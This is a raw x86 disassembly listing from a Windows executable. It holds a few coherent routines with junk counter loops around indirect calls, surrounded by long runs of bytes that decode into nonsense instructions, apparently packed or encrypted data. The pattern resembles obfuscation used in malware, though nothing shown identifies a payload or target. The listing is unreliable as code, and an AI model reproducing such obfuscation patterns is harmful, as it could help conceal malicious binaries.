  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    al,BYTE PTR [ebp-0x65796373]
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb7f
  40ebc0:	(bad)  
  40ebc1:	pop    ss
  40ebc2:	hlt    
  40ebc3:	(bad)  
  40ebc5:	adc    dl,ch
  40ebc7:	sub    eax,ecx
  40ebc9:	loop   0x40ebdc
  40ebcb:	pusha  
  40ebcc:	test   al,al
  40ebce:	mov    BYTE PTR [esi+edx*1-0xf],dl
  40ebd2:	pop    edi
  40ebd3:	call   0x4f68266a
  40ebd8:	js     0x40eba9
  40ebda:	in     eax,0x34
  40ebdc:	jno    0x40eb6d
  40ebde:	sub    eax,0xa7f1fe64
  40ebe3:	or     al,0x4d
  40ebe5:	pushf  
  40ebe6:	je     0x40ebc3
  40ebe8:	inc    edx
  40ebe9:	inc    edx
  40ebea:	dec    ebx
  40ebeb:	ret    0xced9
  40ebee:	push   eax
  40ebef:	adc    BYTE PTR [edi],dl
  40ebf1:	leave  
  40ebf2:	aam    0x4d
  40ebf4:	rcl    DWORD PTR [edi-0x20],1
  40ebf7:	mov    ch,0xde
  40ebf9:	inc    edi
  40ebfa:	sub    al,0x82
  40ebfc:	pop    esi
  40ebfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebff:	jge    0x40ec5c
  40ec01:	xor    BYTE PTR [ebp-0x28b6830b],cl
  40ec07:	mov    esp,0x5bd27d1b
  40ec0c:	pop    ebx
  40ec0d:	mov    edx,0x77909aeb
  40ec12:	sub    al,0x2e
  40ec14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec15:	adc    esi,edi
  40ec17:	lea    esp,fs:[edi-0x5a1b6b9f]
  40ec1e:	mov    edi,0x83bcd910
  40ec23:	or     bh,BYTE PTR [ecx*8+0x79c058f4]
  40ec2a:	sub    BYTE PTR ds:0x3537b737,dl
  40ec30:	xor    bh,BYTE PTR [edi+ebx*1-0x4ed43bd8]
  40ec37:	or     esi,DWORD PTR [ebx-0x32dbbb47]
  40ec3d:	jo     0x40ec7c
  40ec3f:	leave  
  40ec40:	or     edx,edx
  40ec42:	jbe    0x40ec28
  40ec44:	mov    al,ds:0xdc5db17
  40ec49:	jle    0x40eca6
  40ec4b:	imul   ecx,DWORD PTR [ebp-0x759ead49],0x68
  40ec52:	cli    
  40ec53:	fwait
  40ec54:	sbb    DWORD PTR [esi-0x29],0x5c8996f8
  40ec5b:	test   BYTE PTR [ebx],al
  40ec5d:	push   cs
  40ec5e:	clc    
  40ec5f:	lahf   
  40ec60:	out    0xdd,al
  40ec62:	std    
  40ec63:	test   ecx,edx
  40ec65:	push   ebx
  40ec66:	xor    bl,BYTE PTR [edx-0x126cdd44]
  40ec6c:	ins    DWORD PTR es:[edi],dx
  40ec6d:	xor    ch,BYTE PTR [eax-0x53]
  40ec70:	jno    0x40ecc5
  40ec72:	pop    eax
  40ec73:	jg     0x40eca3
  40ec75:	xchg   DWORD PTR [edx-0x61c91486],ebp
  40ec7b:	out    0x37,eax
  40ec7d:	fs mov esp,0x11ecaadc
  40ec83:	pop    esp
  40ec84:	out    dx,al
  40ec85:	jle    0x40ec8b
  40ec87:	dec    esi
  40ec88:	popa   
  40ec89:	or     al,BYTE PTR [esi]
  40ec8b:	dec    ebx
  40ec8c:	sub    al,0x5d
  40ec8e:	cmp    dh,al
  40ec90:	dec    edx
  40ec91:	push   ecx
  40ec92:	ins    DWORD PTR es:[edi],dx
  40ec93:	ins    BYTE PTR es:[edi],dx
  40ec94:	fisub  DWORD PTR [edx+esi*8]
  40ec97:	loope  0x40ecb0
  40ec99:	icebp  
  40ec9a:	pop    ebp
  40ec9b:	sbb    eax,0x2f0b0032
  40eca0:	div    DWORD PTR [ecx+eax*8]
  40eca3:	aam    0xf5
  40eca5:	jl     0x40ec38
  40eca7:	sbb    DWORD PTR [eax-0x7b9098f5],esi
  40ecad:	mov    al,ds:0x8aaf97c0
  40ecb2:	aas    
  40ecb3:	and    BYTE PTR [esi],cl
  40ecb5:	pop    ds
  40ecb6:	repz cld 
  40ecb8:	push   ebx
  40ecb9:	add    DWORD PTR [ebx+0x2837d84],edi
  40ecbf:	push   esp
  40ecc0:	test   DWORD PTR [ebp-0xa],ecx
  40ecc3:	imul   ebp,DWORD PTR [eax+0x32f7e219],0xdd580daa
  40eccd:	mov    bl,0x1a
  40eccf:	test   BYTE PTR [ebx-0x2f],ah
  40ecd2:	or     DWORD PTR [eax+edx*8-0x43118c75],ebx
  40ecd9:	push   ebx
  40ecda:	inc    ebp
  40ecdb:	popf   
  40ecdc:	cmp    DWORD PTR [ecx-0x6f],0x7922f919
  40ece3:	lods   eax,DWORD PTR ds:[esi]
  40ece4:	popa   
  40ece5:	or     eax,0xc506d629
  40ecea:	or     cl,BYTE PTR [ecx]
  40ecec:	jb     0x40ece8
  40ecee:	adc    al,0x24
  40ecf0:	popa   
  40ecf1:	cmp    esi,DWORD PTR [ebp+0x26a318f2]
  40ecf7:	sbb    al,0xb1
  40ecf9:	xchg   esi,eax
  40ecfa:	inc    ebx
  40ecfb:	cmc    
  40ecfc:	(bad)  
  40ecfd:	daa    
  40ecfe:	add    BYTE PTR [edi+0x67698f56],0x4b
  40ed05:	mov    al,0x83
  40ed07:	and    dh,BYTE PTR [edx-0x4d]
  40ed0a:	out    0x8e,al
  40ed0c:	and    eax,0x2338010a
  40ed11:	sbb    al,0x31
  40ed13:	ret    0x632b
  40ed16:	lds    ebx,FWORD PTR [esi]
  40ed18:	cli    
  40ed19:	cli    
  40ed1a:	push   cs
  40ed1b:	cld    
  40ed1c:	fadd   QWORD PTR [ebp+0x65025f95]
  40ed22:	popf   
  40ed23:	xor    DWORD PTR [edi],0xc33565bd
  40ed29:	pop    edi
  40ed2a:	or     al,0xeb
  40ed2c:	icebp  
  40ed2d:	push   esi
  40ed2e:	push   esp
  40ed2f:	cmp    eax,0x1a24f2d
  40ed34:	inc    esp
  40ed35:	shr    al,0xb2
  40ed38:	sub    BYTE PTR [edx],0xd5
  40ed3b:	into   
  40ed3c:	dec    ebp
  40ed3d:	add    BYTE PTR [eax-0x42],dl
  40ed40:	sub    eax,0x77810dce
  40ed45:	test   edi,ecx
  40ed47:	call   FWORD PTR [edi-0x3ddb9e37]
  40ed4d:	mov    ecx,0x82567ef7
  40ed52:	test   eax,ebp
  40ed54:	add    BYTE PTR [edx+0x8c52983],0x11
  40ed5b:	push   esi
  40ed5c:	jmp    0x65bf1c3d
  40ed61:	adc    DWORD PTR [ecx+ebp*1-0x7d],esp
  40ed65:	fcomp  QWORD PTR [eax]
  40ed67:	mov    bh,0x5
  40ed69:	dec    ebx
  40ed6a:	fmul   DWORD PTR [eax+edx*8]
  40ed6d:	sbb    DWORD PTR [edx+0x0],edx
  40ed70:	adc    dl,BYTE PTR es:[ebp+0x46]
  40ed74:	pop    esp
  40ed75:	in     eax,dx
  40ed76:	hlt    
  40ed77:	xor    DWORD PTR [edi-0x6b5fd9bb],edi
  40ed7d:	hlt    
  40ed7e:	dec    eax
  40ed7f:	ficom  DWORD PTR [edi-0x70]
  40ed82:	int    0x36
  40ed84:	and    al,BYTE PTR [edx+0x67]
  40ed87:	lods   eax,DWORD PTR ds:[esi]
  40ed88:	test   al,0x3d
  40ed8a:	(bad)  
  40ed8b:	sbb    al,0x4f
  40ed8d:	data16 jbe 0x40edae
  40ed90:	sbb    esp,0xffffffc4
  40ed93:	or     DWORD PTR [eax+0x4a],0xffffffbe
  40ed97:	xor    bh,BYTE PTR [ebx+esi*1-0x3e]
  40ed9b:	sub    ecx,DWORD PTR ds:0x433753
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x124fb3de]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	clc    
  40ee77:	or     bl,cl
  40ee79:	mov    dl,al
  40ee7b:	push   ds
  40ee7c:	dec    esi
  40ee7d:	push   ss
  40ee7e:	(bad)  
  40ee7f:	jle    0x40ee52
  40ee81:	jmp    0x40ee83
  40ee83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee84:	ds clc 
  40ee86:	dec    ebx
  40ee87:	jno    0x40ee8b
  40ee89:	inc    edi
  40ee8a:	sbb    al,0x3f
  40ee8c:	cmp    al,0xc3
  40ee8e:	push   edx
  40ee8f:	leave  
  40ee90:	mov    bh,0xbc
  40ee92:	xor    al,0x72
  40ee94:	lds    ebp,FWORD PTR [edx-0x40]
  40ee97:	fisubr WORD PTR [ecx-0x6fa0e5d6]
  40ee9d:	sar    DWORD PTR [edi-0x7],0x94
  40eea1:	imul   eax,DWORD PTR [eax],0xffffff8f
  40eea4:	call   0x1982:0x8803458a
  40eeab:	arpl   bp,bp
  40eead:	pop    esi
  40eeae:	sub    eax,0x6507e167
  40eeb3:	cwde   
  40eeb4:	loope  0x40ee54
  40eeb6:	mov    ds:0x992fc36b,al
  40eebb:	xchg   DWORD PTR [ebx+0x152e8d7e],ebx
  40eec1:	adc    ecx,esi
  40eec3:	mov    cs:0x846f3da1,al
  40eec9:	sub    DWORD PTR [edi+0x79],0xc276aaac
  40eed0:	push   esp
  40eed1:	cwde   
  40eed2:	xchg   edx,eax
  40eed3:	mov    eax,ds:0x7923728d
  40eed8:	test   al,0xbd
  40eeda:	data16 mov ds:0xad29eeef,al
  40eee0:	mov    ds:0xd57eb14d,eax
  40eee5:	pop    eax
  40eee6:	or     eax,0x42ba2d0
  40eeeb:	jmp    0xf752:0x7539e084
  40eef2:	test   esi,ebx
  40eef4:	push   edx
  40eef5:	nop
  40eef6:	push   edx
  40eef7:	sysexit 
  40eef9:	lds    ebx,FWORD PTR [ecx]
  40eefb:	sbb    DWORD PTR ds:0xed0196d8,eax
  40ef01:	mov    ebp,DWORD PTR [eax]
  40ef03:	(bad)  
  40ef04:	mov    cl,0x9
  40ef06:	enter  0x7c48,0x2
  40ef0a:	push   ecx
  40ef0b:	mov    al,0x2f
  40ef0d:	push   ecx
  40ef0e:	outs   dx,DWORD PTR ds:[esi]
  40ef0f:	in     al,dx
  40ef10:	call   0x63556255
  40ef15:	mov    eax,ds:0x8558985f
  40ef1a:	mov    al,0x55
  40ef1c:	dec    edx
  40ef1d:	jb     0x40ef49
  40ef1f:	fbld   TBYTE PTR [edi]
  40ef21:	scas   eax,DWORD PTR es:[edi]
  40ef22:	push   0x71
  40ef24:	leave  
  40ef25:	enter  0x26b,0x63
  40ef29:	mov    ebx,0xbfd04fb8
  40ef2e:	dec    esi
  40ef2f:	pop    esp
  40ef30:	xor    BYTE PTR [edx+0x50],cl
  40ef33:	jmp    0xe863c0e0
  40ef38:	jmp    0x40ef5b
  40ef3a:	dec    ebx
  40ef3b:	fwait
  40ef3c:	je     0x40ef1b
  40ef3e:	push   esp
  40ef3f:	adc    BYTE PTR [edi],cl
  40ef41:	mov    DWORD PTR [edx],edx
  40ef43:	push   ebx
  40ef44:	dec    eax
  40ef45:	jmp    FWORD PTR [ebx-0x484a47b3]
  40ef4b:	addr16 in eax,0xeb
  40ef4e:	outs   dx,BYTE PTR ds:[esi]
  40ef4f:	stos   BYTE PTR es:[edi],al
  40ef50:	jnp    0x40ef1c
  40ef52:	xchg   ebx,eax
  40ef53:	(bad)  
  40ef54:	jge    0x40ef7a
  40ef56:	or     BYTE PTR [esi],dl
  40ef58:	cmp    ebx,DWORD PTR [edx]
  40ef5a:	mov    dl,BYTE PTR [esi+0xc9f9f4c]
  40ef60:	xor    eax,0xcddecefa
  40ef65:	shl    DWORD PTR [ecx],1
  40ef67:	cmp    dh,BYTE PTR [ebp+0x52]
  40ef6a:	out    dx,eax
  40ef6b:	test   al,0xfc
  40ef6d:	shl    BYTE PTR [eax],1
  40ef6f:	mov    bh,0x2e
  40ef71:	adc    bh,BYTE PTR [ebx]
  40ef73:	push   edi
  40ef74:	(bad)  
  40ef75:	aad    0xbd
  40ef77:	mov    ds:0xe6c11034,al
  40ef7c:	sahf   
  40ef7d:	jno    0x40ef06
  40ef7f:	xchg   edx,eax
  40ef80:	jmp    0x40ef7f
  40ef82:	in     eax,0xab
  40ef84:	add    ebx,ebx
  40ef86:	stos   DWORD PTR es:[edi],eax
  40ef87:	cli    
  40ef88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef89:	into   
  40ef8a:	test   DWORD PTR [esi+0x31],edx
  40ef8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef8e:	push   0x36c6248
  40ef93:	retf   
  40ef94:	nop
  40ef95:	jnp    0x40efd8
  40ef97:	daa    
  40ef98:	xchg   ecx,eax
  40ef99:	jbe    0x40efc5
  40ef9b:	xchg   esi,eax
  40ef9c:	je     0x40ef46
  40ef9e:	inc    ecx
  40ef9f:	dec    edx
  40efa0:	inc    ebx
  40efa1:	mov    cl,0xb9
  40efa3:	add    edx,ebp
  40efa5:	and    BYTE PTR ds:0xdcdf6c53,dl
  40efab:	xor    edx,esp
  40efad:	jle    0x40ef5c
  40efaf:	inc    esp
  40efb0:	jg     0x40efca
  40efb2:	ds add eax,0x72b17573
  40efb8:	in     eax,0x2b
  40efba:	and    ebx,DWORD PTR [edx+esi*4+0x37b0561]
  40efc1:	loope  0x40f012
  40efc3:	and    al,BYTE PTR [ecx+0x59e77316]
  40efc9:	or     DWORD PTR [eax*1-0x61bdd7c8],esp
  40efd0:	dec    esi
  40efd1:	lods   eax,DWORD PTR ds:[esi]
  40efd2:	cmp    eax,0x179c4576
  40efd7:	or     dh,BYTE PTR [ebp+0x5e7b8e7f]
  40efdd:	ret    
  40efde:	mov    al,0x15
  40efe0:	les    ebp,FWORD PTR [edi+0x20]
  40efe3:	mov    cl,0xc7
  40efe5:	push   cs
  40efe6:	mov    edi,es
  40efe8:	pslld  mm6,QWORD PTR ds:0xe58b4bad
  40efef:	in     eax,0x30
  40eff1:	addr16 sub al,0x2
  40eff4:	fldenv [esi+0xb]
  40eff7:	jp     0x40f068
  40eff9:	sbb    DWORD PTR [eax+0x34],ebx
  40effc:	lahf   
  40effd:	imul   esp,DWORD PTR [esi],0x166d5f44
  40f003:	xchg   esp,eax
  40f004:	cmp    ebx,edx
  40f006:	cmp    eax,0xc30f8a9f
  40f00b:	xchg   ecx,eax
  40f00c:	xchg   DWORD PTR cs:[esi],esp
  40f00f:	dec    ecx
  40f010:	mov    dl,0x58
  40f012:	dec    ecx
  40f013:	jecxz  0x40f01a
  40f015:	stos   BYTE PTR es:[edi],al
  40f016:	cs push edx
  40f018:	cdq    
  40f019:	aad    0x38
  40f01b:	(bad)  
  40f01d:	sbb    eax,0xd0fbf768
  40f022:	xchg   edi,eax
  40f023:	push   ecx
  40f024:	cdq    
  40f025:	or     al,0x2e
  40f027:	stos   BYTE PTR es:[edi],al
  40f028:	mov    esp,0xbe4841b
  40f02d:	mov    ch,BYTE PTR [ecx]
  40f02f:	inc    ebp
  40f030:	mov    cl,0xf
  40f032:	or     al,0xfe
  40f034:	dec    eax
  40f035:	stos   DWORD PTR es:[edi],eax
  40f036:	mov    ah,0x24
  40f038:	pushf  
  40f039:	sbb    bl,BYTE PTR [ebx]
  40f03b:	mov    ebp,0x3664e651
  40f040:	mov    cl,0xd
  40f042:	cmc    
  40f043:	mov    ds:0x57fbaa44,eax
  40f048:	fiadd  WORD PTR [edx-0x58fb8a01]
  40f04e:	sub    al,0xb3
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x3baf1594,ebx
  40f076:	loopne 0x40f0b2
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	sbb    eax,0xcba4453c
  40f085:	out    dx,al
  40f086:	jns    0x40f03d
  40f088:	cs push esp
  40f08a:	fstp   QWORD PTR [esi]
  40f08c:	int3   
  40f08d:	sub    BYTE PTR [eax],dh
  40f08f:	ss clc 
  40f091:	js     0x40f100
  40f093:	out    dx,al
  40f094:	mov    ebx,0x88376afa
  40f099:	sbb    BYTE PTR ds:0x1ab8aea,ah
  40f09f:	dec    esi
  40f0a0:	push   edi
  40f0a1:	popf   
  40f0a2:	cmp    DWORD PTR [eax],eax
  40f0a4:	int3   
  40f0a5:	les    esp,FWORD PTR es:[esi]
  40f0a8:	daa    
  40f0a9:	adc    BYTE PTR [edx+0x6e85ee64],ch
  40f0af:	xchg   ebp,eax
  40f0b0:	repnz dec esi
  40f0b2:	fcmovnu st,st(4)
  40f0b4:	test   BYTE PTR [edx-0x7bec6fc1],0x7b
  40f0bb:	repnz jecxz 0x40f097
  40f0be:	mov    edi,0xa044094
  40f0c3:	mov    ds:0x73420f7c,al
  40f0c8:	jne    0x40f0a7
  40f0ca:	xchg   esp,eax
  40f0cb:	(bad)  
  40f0cc:	arpl   bp,ax
  40f0ce:	mov    ds:0xd5845ee1,eax
  40f0d3:	push   cs
  40f0d4:	and    dh,BYTE PTR [eax+ebp*2+0x49fa95de]
  40f0db:	mov    dh,0x8b
  40f0dd:	das    
  40f0de:	mov    bl,dl
  40f0e0:	sbb    ebx,edi
  40f0e2:	add    ah,BYTE PTR [esp+edi*8-0x73]
  40f0e6:	cld    
  40f0e7:	jl     0x40f07c
  40f0e9:	xchg   edx,eax
  40f0ea:	sub    ah,BYTE PTR [esi-0x55]
  40f0ed:	push   eax
  40f0ee:	push   0x8d6fac70
  40f0f3:	cmp    edx,esp
  40f0f5:	jg     0x40f154
  40f0f7:	xchg   ebp,eax
  40f0f8:	pop    edx
  40f0f9:	push   ss
  40f0fa:	jb     0x40f0fc
  40f0fc:	sbb    al,0xb9
  40f0fe:	mov    edi,esp
  40f100:	add    BYTE PTR ds:0x1e636620,0x12
  40f107:	ror    BYTE PTR [eax+0x58de1bbf],1
  40f10d:	shr    ah,cl
  40f10f:	mov    ecx,DWORD PTR [esi]
  40f111:	fild   WORD PTR [edi+0x3f]
  40f114:	mov    dh,0x33
  40f116:	inc    BYTE PTR [esp+esi*2]
  40f119:	dec    ecx
  40f11a:	daa    
  40f11b:	or     DWORD PTR [eax+0x65],ebp
  40f11e:	sub    BYTE PTR [eax+0x4d898911],bl
  40f124:	add    ah,BYTE PTR [ebx+0x7d]
  40f127:	(bad)  
  40f128:	fmul   st,st(3)
  40f12a:	mov    ?,WORD PTR [ebx]
  40f12c:	aas    
  40f12d:	loopne 0x40f146
  40f12f:	(bad)  
  40f130:	push   ebp
  40f131:	fdiv   DWORD PTR [ecx-0x14ad89ec]
  40f137:	out    dx,al
  40f138:	outs   dx,BYTE PTR ds:[esi]
  40f139:	outs   dx,BYTE PTR ss:[esi]
  40f13b:	adc    al,0x12
  40f13d:	mov    ds:0x5764c5e4,al
  40f142:	pushf  
  40f143:	nop
  40f144:	push   ecx
  40f145:	push   ebx
  40f146:	loop   0x40f137
  40f148:	sub    ch,BYTE PTR [edi]
  40f14a:	dec    eax
  40f14b:	call   0x2184:0x245626e5
  40f152:	test   eax,0x57c1a4b7
  40f157:	jmp    0x1e13:0x633c7fc7
  40f15e:	ret    0x92ab
  40f161:	xchg   ebx,eax
  40f162:	adc    esi,DWORD PTR [ecx-0x5d]
  40f165:	fst    QWORD PTR [ebp+eiz*2+0x59443565]
  40f16c:	jmp    0x6eabf690
  40f171:	or     BYTE PTR [ebx+ebx*4-0x25],ch
  40f175:	sub    BYTE PTR [ecx],cl
  40f177:	xchg   ebp,eax
  40f178:	jecxz  0x40f1e2
  40f17a:	inc    esi
  40f17b:	jbe    0x40f12a
  40f17d:	mov    ds:0xdebf3f19,al
  40f182:	popa   
  40f183:	push   esp
  40f184:	retf   
  40f185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f186:	ss clc 
  40f188:	(bad)  
  40f189:	cdq    
  40f18a:	sbb    BYTE PTR [edi-0x44],cl
  40f18d:	test   eax,0x753ed1f5
  40f192:	mov    cl,0x77
  40f194:	push   cs
  40f195:	or     edi,eax
  40f197:	jmp    0x729a81cd
  40f19c:	sbb    BYTE PTR [edi],dh
  40f19e:	mov    bl,0x1c
  40f1a0:	data16 adc al,dh
  40f1a3:	mov    ds,WORD PTR [esi+edi*8+0x27]
  40f1a7:	int3   
  40f1a8:	(bad)  
  40f1a9:	pop    edx
  40f1aa:	push   0xffffffa8
  40f1ac:	(bad)  
  40f1ad:	push   0x46
  40f1af:	and    ecx,ebp
  40f1b1:	inc    ebp
  40f1b2:	jmp    0x40f185
  40f1b4:	sahf   
  40f1b5:	add    ecx,ebp
  40f1b7:	in     al,dx
  40f1b8:	xlat   BYTE PTR ds:[ebx]
  40f1b9:	sbb    bh,bl
  40f1bb:	retf   
  40f1bc:	(bad)  
  40f1bd:	inc    esi
  40f1be:	dec    esp
  40f1bf:	cmp    edx,DWORD PTR [edi-0xb18f82]
  40f1c5:	jg     0x40f185
  40f1c7:	(bad)  
  40f1c8:	repnz fcom QWORD PTR [ecx+0x4c7f648]
  40f1cf:	adc    DWORD PTR [edi-0x636a0461],0xf
  40f1d6:	scas   eax,DWORD PTR es:[edi]
  40f1d7:	add    DWORD PTR [ecx-0x31acb72e],ecx
  40f1dd:	and    al,0xd4
  40f1df:	mov    bh,BYTE PTR [edi+0x7]
  40f1e2:	call   0xfa173e4e
  40f1e7:	xor    ch,al
  40f1e9:	pop    edi
  40f1ea:	sub    al,0x11
  40f1ec:	mul    DWORD PTR ds:0x716a72f9
  40f1f2:	rcl    BYTE PTR [esi],0x2b
  40f1f5:	lock daa 
  40f1f7:	nop
  40f1f8:	xor    dh,0x3
  40f1fb:	or     edi,edx
  40f1fd:	adc    BYTE PTR [ebp-0x1792fc5d],0x97
  40f204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f205:	in     eax,0x26
  40f207:	cmp    ebx,DWORD PTR [edi+0x57943a4f]
  40f20d:	fs aad 0xa8
  40f210:	pop    ebp
  40f211:	cmp    al,0xf6
  40f213:	fnsave [ebx-0x2e1e9978]
  40f219:	xor    bh,al
  40f21b:	lea    ecx,[esi]
  40f21d:	sahf   
  40f21e:	dec    edi
  40f21f:	push   esp
  40f220:	(bad)  
  40f221:	or     ebx,DWORD PTR [bx+0x5b1f]
  40f226:	xlat   BYTE PTR ds:[ebx]
  40f227:	push   edi
  40f228:	fimul  DWORD PTR [edx+ebp*4]
  40f22b:	mov    bl,0x60
  40f22d:	shl    BYTE PTR [eax-0xc98c5b3],cl
  40f233:	cmp    DWORD PTR [ebx+0x6c6ad619],esp
  40f239:	fiadd  WORD PTR [ecx+0x46c2a2a5]
  40f23f:	pop    eax
  40f240:	push   ds
  40f241:	fcomp  QWORD PTR [eax+esi*2+0x1a232056]
  40f248:	(bad)  
  40f249:	aaa    
  40f24a:	sbb    BYTE PTR [ecx+0x558663b4],dh
  40f250:	adc    edx,ebp
  40f252:	jne    0x40f1e9
  40f254:	dec    edx
  40f255:	mov    esi,0xc3e5e2fa
  40f25a:	ret    0xee51
  40f25d:	pop    esp
  40f25e:	int    0x64
  40f260:	mov    al,ds:0xf0b3ed90
  40f265:	cli    
  40f266:	das    
  40f267:	sbb    ecx,DWORD PTR ds:0xffa30cf3
  40f26d:	push   0x10de0914
  40f272:	fcmovbe st,st(2)
  40f274:	mov    al,0xc
  40f276:	add    dh,BYTE PTR [edi*2-0xed11ac0]
  40f27d:	(bad)  
  40f27e:	mov    bl,0x21
  40f280:	sbb    al,BYTE PTR [eax+0x55edff7b]
  40f286:	out    dx,al
  40f287:	daa    
  40f288:	jnp    0x40f2b5
  40f28a:	cld    
  40f28b:	aad    0xac
  40f28d:	or     ch,bl
  40f28f:	xor    DWORD PTR [ecx],esp
  40f291:	jne    0x40f2f1
  40f293:	inc    eax
  40f294:	pushf  
  40f295:	jno    0x40f232
  40f297:	leave  
  40f298:	sbb    bh,bl
  40f29a:	cmp    dh,dh
  40f29c:	jnp    0x40f2c9
  40f29e:	rol    BYTE PTR ds:0x39e99649,0x19
  40f2a5:	cwde   
  40f2a6:	mov    esi,0x8d699b1a
  40f2ab:	in     al,dx
  40f2ac:	test   DWORD PTR cs:[ecx-0x30],eax
  40f2b0:	dec    edx
  40f2b1:	push   es
  40f2b2:	pop    ss
  40f2b3:	(bad)  
  40f2b4:	fcom   DWORD PTR [ebx]
  40f2b6:	fdiv   QWORD PTR ds:0x324e788
  40f2bc:	cmp    BYTE PTR [ebx],0x9f
  40f2bf:	dec    esi
  40f2c0:	call   DWORD PTR [ecx]
  40f2c2:	mov    ebp,0xfa31fa53
